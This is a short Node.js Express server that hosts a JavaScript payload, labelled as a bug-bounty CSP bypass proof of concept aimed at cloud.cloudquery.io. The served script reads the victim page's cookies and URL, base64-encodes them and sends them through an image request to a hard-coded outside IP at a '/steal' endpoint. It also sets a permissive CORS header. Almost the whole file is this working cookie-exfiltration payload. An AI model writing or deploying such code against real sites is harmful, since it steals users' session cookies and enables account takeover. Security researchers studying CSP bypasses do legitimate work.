const express = require('express');
const app = express();

// Serve attack.js as JavaScript
app.get('/attack.js', (req, res) => {
  res.setHeader('Content-Type', 'application/javascript');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.send(`
// CloudQuery CSP Bypass PoC - Bug Bounty Research
(function() {
  var d = {
    cookies: document.cookie,
    url: window.location.href,
    ts: new Date().toISOString()
  };
  new Image().src = 'http://3.108.6.174:8920/steal?d=' + btoa(JSON.stringify(d));
  console.log('[CSP BYPASS] cloud.cloudquery.io context confirmed');
})();
`);
});

// Default route
app.get('/', (req, res) => {
  res.json({message: 'get connect'});
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log('Server running on', port));
